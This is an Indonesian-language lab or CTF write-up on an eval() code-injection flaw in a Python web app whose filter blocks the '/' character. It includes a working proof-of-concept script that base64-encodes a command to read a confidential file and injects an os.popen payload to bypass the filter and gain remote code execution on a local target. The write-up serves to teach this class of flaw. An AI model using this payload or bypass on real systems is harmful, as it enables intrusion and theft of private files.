---
title: Rahasia Kuya
description: Writeup lab Rahasia Kuya
tags:
  - input injection
  - code injection
  - waf bypass
  - python
  - CTF
draft: false
---

## Summary
* Vuln Name: `eval()` Injection dengan WAF Bypass
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]], [[web-application-firewall]]

## Metodologi dan Observasi
1. Pada aplikasi web Python ini, perancang mensimulasikan penerapan [[web-application-firewall]] (WAF) primitif untuk mencegah serangan injeksi dengan memblokir karakter garis miring (`/`).
   ```python
   name = request.args.get('name', '')
   if '/' in name:
       return "<h2 style='color:red;'>Security Alert: Malicious character detected!</h2>", 403
   ```
2. Aplikasi kemudian memproses respons sapaan (*greeting*) pengguna di dalam fungsi `eval()` yang ceroboh:
   ```python
   greeting = eval(f"'{greeting}' + '{name}'")
   ```
3. Cacat arsitektur `eval` ini sudah familiar sebagai kerentanan [[code-injection]]. Namun, absennya karakter `/` membuat penyerang tidak bisa memberikan _path absolute_ dalam biner utilitas (*misalnya*: mengeksekusi `/bin/sh` atau membaca direktori `/home/kuya/confidential.txt`).
4. Untuk mengelabui sensor keamanan terbatas ini, kita mendemonstrasikan teknik [[waf-bypass]]. Alih-alih merangkai susunan rute fail di antarmuka luar yang kasat mata, peretas meletakkan komando jahat itu ke dalam enkoding _Base64_ terlebih dahulu.
5. Selanjutnya, kita memanfaatkan kapabilitas _built-in_ penguraian bawaan bahasa pemrograman sasaran (*Python lib*) untuk menerjemahkan nilai rahasia tadi dan mengirimnya tepat pada saat *runtime* (ketika pemeriksaan parameter oleh *WAF* di awal sudah usai dilakukan).

## PoC
Skrip di bawah mengirimkan kode sisipan _Python_ yang mengandung skrip _decode Base64_ dan melangsungkan interaksi akses komando yang melangkaui *Input Validation* server.

```python
import requests
import base64

url = "http://localhost:1337"

# Objektif: sudo -u kuya ruby -e 'puts File.read("/home/kuya/confidential.txt")'
cmd = "sudo -u kuya ruby -e 'puts File.read(\"/home/kuya/confidential.txt\")'"

# Menghindari karakter '/' pada string masukan dengan mengubah ke format base64
b64_cmd = base64.b64encode(cmd.encode()).decode()

# String Base64 "c3VkbyB..." ini akan dieksekusi oleh Python di sisi server
# Melarikan diri dari payload dengan format: ' + __import(...) + '
payload = f"' + str(__import__('os').popen(__import__('base64').b64decode('{b64_cmd}').decode()).read()) + '"

params = {'name': payload}
res = requests.get(url, params=params)

if "pwn{" in res.text:
    print(f"[+] Bypass dan RCE berhasil! Output:\n{res.text}")
```

## Impact
Kegagalan implementasi pembatasan _allow/deny list_ manual pada sistem penjagaan seperti ModSecurity WAF buatan dapat berujung pada lolosnya utilitas berakibat fatal. [[remote-code-execution]] yang memanfaatkan de-obfuskasi ini membuat peretas masih dapat sepenuhnya mengambil alih instansi komputasi melalui teknik penyandian yang lolos dari validasi _input_ awal.
